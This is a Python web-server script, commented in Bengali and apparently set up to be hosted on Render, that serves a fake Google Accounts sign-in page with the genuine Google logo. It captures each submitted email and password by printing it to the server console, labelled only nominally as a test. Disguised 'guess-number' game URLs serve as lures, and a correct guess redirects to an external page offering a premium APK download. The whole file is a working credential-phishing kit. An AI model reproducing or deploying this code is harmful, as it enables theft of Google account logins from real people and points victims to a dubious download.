from http.server import HTTPServer, BaseHTTPRequestHandler
import random
import string
import urllib.parse
from urllib.parse import parse_qs, urlparse
import os  # এনভায়রনমেন্ট ভ্যারিয়েবলের জন্য

# গুগল সাইটের লিংক
SUCCESS_REDIRECT_URL = "https://sites.google.com/view/top6premium-apk-download/home"

# এলোমেলো URL পাথ তৈরি
def generate_random_string(length=10):
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for _ in range(length))

# কাস্টম URL তৈরি
def create_fun_url(base_url=None):
    if base_url is None:
        # Render-এর ক্ষেত্রে আমরা base_url হিসেবে Render-এর URL ব্যবহার করব
        base_url = os.getenv("RENDER_EXTERNAL_URL", "http://localhost:8080")
        if not base_url:
            base_url = "http://localhost:8080"  # ফলব্যাক
    fun_path = f"play-{generate_random_string()}"
    fake_params = {
        "game": "guess-number",
        "id": generate_random_string(5)
    }
    encoded_params = urllib.parse.urlencode(fake_params)
    fun_url = f"{base_url}/{fun_path}?{encoded_params}"
    return fun_url

# নকল গুগল লগইন পেজের HTML
fake_login_page_html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f2f2f2;
            margin: 0;
        }
        .login-box {
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            width: 400px;
            text-align: center;
        }
        .logo {
            margin-bottom: 20px;
        }
        .logo img {
            width: 100px;
        }
        h2 {
            font-size: 24px;
            color: #202124;
            margin-bottom: 10px;
        }
        p {
            font-size: 16px;
            color: #5f6368;
            margin-bottom: 20px;
        }
        input[type="email"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background-color: #1557b0;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
        </div>
        <h2>Sign in</h2>
        <p>Use your Google Account</p>
        <form method="POST" action="/login">
            <input type="email" name="email" placeholder="Email or phone" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign in</button>
        </form>
    </div>
</body>
</html>
"""

# গেম পেজের HTML (৩টি অপশন সহ)
fun_page_html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Guess the Number - Fun Zone</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #e0f7fa;
            margin: 0;
        }}
        .game-box {{
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            text-align: center;
            width: 400px;
        }}
        h1 {{
            color: #007bff;
        }}
        .options {{
            display: flex;
            justify-content: space-around;
            margin: 20px 0;
        }}
        button {{
            padding: 10px 20px;
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }}
        button:hover {{
            background-color: #218838;
        }}
        #result {{
            margin-top: 20px;
            font-size: 18px;
            color: #d9534f;
        }}
    </style>
</head>
<body>
    <div class="game-box">
        <h1>Guess the Number, {user_name}!</h1>
        <p>Choose the correct number between 1 and 100:</p>
        <div class="options">
            <form method="POST" action="/guess">
                <input type="hidden" name="guess" value="{option1}">
                <button type="submit">{option1}</button>
            </form>
            <form method="POST" action="/guess">
                <input type="hidden" name="guess" value="{option2}">
                <button type="submit">{option2}</button>
            </form>
            <form method="POST" action="/guess">
                <input type="hidden" name="guess" value="{option3}">
                <button type="submit">{option3}</button>
            </form>
        </div>
        <div id="result">{result}</div>
    </div>
    <script>
        console.log("Welcome to the Fun Zone!");
    </script>
</body>
</html>
"""

# HTTP সার্ভার হ্যান্ডলার
class FunHandler(BaseHTTPRequestHandler):
    user_name = None
    secret_number = None

    def generate_options(self):
        # সঠিক সংখ্যা জেনারেট করা
        if FunHandler.secret_number is None:
            FunHandler.secret_number = random.randint(1, 100)

        # ৩টি অপশন জেনারেট করা
        correct_number = FunHandler.secret_number
        # সঠিক সংখ্যার কাছাকাছি দুটি ভুল সংখ্যা
        option1 = correct_number
        option2 = random.randint(max(1, correct_number - 20), max(1, correct_number - 1))
        option3 = random.randint(min(100, correct_number + 1), min(100, correct_number + 20))

        # অপশনগুলো শাফল করা
        options = [option1, option2, option3]
        random.shuffle(options)
        return options

    def do_GET(self):
        parsed_path = urlparse(self.path)
        path = parsed_path.path

        # লগইন পেজ
        if path == "/":
            if FunHandler.user_name is None:
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(fake_login_page_html.encode("utf-8"))
            else:
                # ব্যবহারকারী লগইন করেছে, গেম পেজ দেখান
                options = self.generate_options()
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(fun_page_html.format(
                    result="",
                    user_name=FunHandler.user_name,
                    option1=options[0],
                    option2=options[1],
                    option3=options[2]
                ).encode("utf-8"))

    def do_POST(self):
        parsed_path = urlparse(self.path)
        path = parsed_path.path

        # লগইন ফর্ম হ্যান্ডলিং
        if path == "/login":
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode("utf-8")
            parsed_data = parse_qs(post_data)

            # ইমেল এবং পাসওয়ার্ড পাওয়া (শুধুমাত্র টেস্টিং উদ্দেশ্যে)
            email = parsed_data.get("email", [""])[0]
            password = parsed_data.get("password", [""])[0]
            print(f"\n[TEST] Email: {email}, Password: {password}")

            # নকল লগইন সফল, ব্যবহারকারীর নাম সেট করা
            FunHandler.user_name = email.split("@")[0]  # ইমেল থেকে নাম নেওয়া (উদাহরণস্বরূপ)

            # গেম পেজে রিডাইরেক্ট
            self.send_response(302)
            self.send_header("Location", "/")
            self.end_headers()

        # গেস ফর্ম হ্যান্ডলিং
        elif path == "/guess":
            if FunHandler.user_name is None:
                self.send_response(302)
                self.send_header("Location", "/")
                self.end_headers()
                return

            # ফর্ম থেকে ডেটা পড়া
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode("utf-8")
            parsed_data = parse_qs(post_data)

            # ব্যবহারকারীর গেস
            user_guess = int(parsed_data.get("guess", ["0"])[0])

            # সঠিক সংখ্যার সাথে তুলনা
            if user_guess == FunHandler.secret_number:
                # সঠিক গেস, গুগল সাইটে রিডাইরেক্ট
                self.send_response(302)
                self.send_header("Location", SUCCESS_REDIRECT_URL)
                self.end_headers()
                FunHandler.secret_number = None  # রিসেট করা
            else:
                # ভুল গেস, নতুন সংখ্যা জেনারেট করা
                FunHandler.secret_number = None  # নতুন সংখ্যার জন্য রিসেট
                options = self.generate_options()
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(fun_page_html.format(
                    result="Wrong! Try again with a new number.",
                    user_name=FunHandler.user_name,
                    option1=options[0],
                    option2=options[1],
                    option3=options[2]
                ).encode("utf-8"))

# সার্ভার চালু করা
def run_server():
    port = int(os.getenv("PORT", 8080))  # Render-এর PORT ভ্যারিয়েবল ব্যবহার করুন, ডিফল্ট 8080
    server_address = ('0.0.0.0', port)  # Render-এর জন্য '0.0.0.0' ব্যবহার করুন
    httpd = HTTPServer(server_address, FunHandler)
    print(f"মজার ওয়েবসাইট চালু হয়েছে পোর্ট {port} এ")
    httpd.serve_forever()

# প্রধান ফাংশন
if __name__ == "__main__":
    fun_url = create_fun_url()
    print(f"তৈরি করা মজার URL: {fun_url}")
    try:
        run_server()
    except KeyboardInterrupt:
        print("\nসার্ভার বন্ধ করা হয়েছে।")